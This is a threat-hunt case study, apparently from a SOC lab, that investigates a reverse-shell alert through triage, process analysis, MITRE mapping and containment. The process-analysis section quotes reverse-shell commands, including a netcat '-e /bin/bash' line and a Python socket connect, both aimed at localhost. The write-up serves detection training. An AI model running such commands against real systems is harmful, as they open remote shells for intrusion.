# Threat Hunt Case Study 02 — Reverse Shell Detection

## Summary

On 2026-06-07 at 11:40 BST, the Reverse Shell Detection rule fired on host sentinel-soc. This documents the full investigation from alert triage to containment.

## Alert Details

- **Rule:** Reverse Shell Detection
- **Severity:** High
- **Risk Score:** 85
- **MITRE:** T1059.004 — Command and Scripting Interpreter: Unix Shell
- **Timestamp:** 2026-06-07 @ 11:40 BST

## Investigation Steps

### 1. Alert Triage
Kibana Security → Alerts showed a High severity alert with risk score 85 — the highest in the environment. Rule fired on process.args matching reverse shell patterns on host sentinel-soc.

### 2. Process Analysis
Auditbeat captured three suspicious processes spawned in rapid succession:
- `bash -i` — interactive bash shell (classic reverse shell indicator)
- `python3 -c "import socket; s=socket.socket(); s.connect(('127.0.0.1',9999))"` — Python socket connection attempt
- `nc -e /bin/bash 127.0.0.1 9999` — netcat with shell execution flag

### 3. Scope Assessment
All three processes attempted to connect to 127.0.0.1:9999. No listener was active on port 9999, so all connections failed immediately. No data exfiltration occurred.

### 4. Attacker Behaviour
The pattern is consistent with an attacker who has already gained code execution on the system and is attempting to establish a persistent reverse shell back to their C2 server. The use of three different methods (bash, python3, netcat) suggests automated tooling or a playbook-style attack.

## MITRE ATT&CK Mapping

- **Tactic:** Execution
- **Technique:** T1059.004 — Command and Scripting Interpreter: Unix Shell

## Verdict

Contained. All reverse shell attempts failed — no listener on target port. No successful C2 connection established.

## Response

```bash
# Kill any remaining suspicious processes
sudo pkill -f "bash -i"
sudo pkill -f "nc -e"

# Check for any established outbound connections
sudo ss -tulpn | grep ESTABLISHED

# Review all processes spawned by the user
sudo ausearch -ua mack --start today
```

## Lessons Learned

- The rule successfully detected all three reverse shell techniques within 1 minute
- Auditbeat process.args field was key — process.command_line was not populated in this environment, requiring rule tuning
- Multiple reverse shell methods attempted simultaneously suggests automated tooling
- High risk score (85) correctly prioritised this alert above others
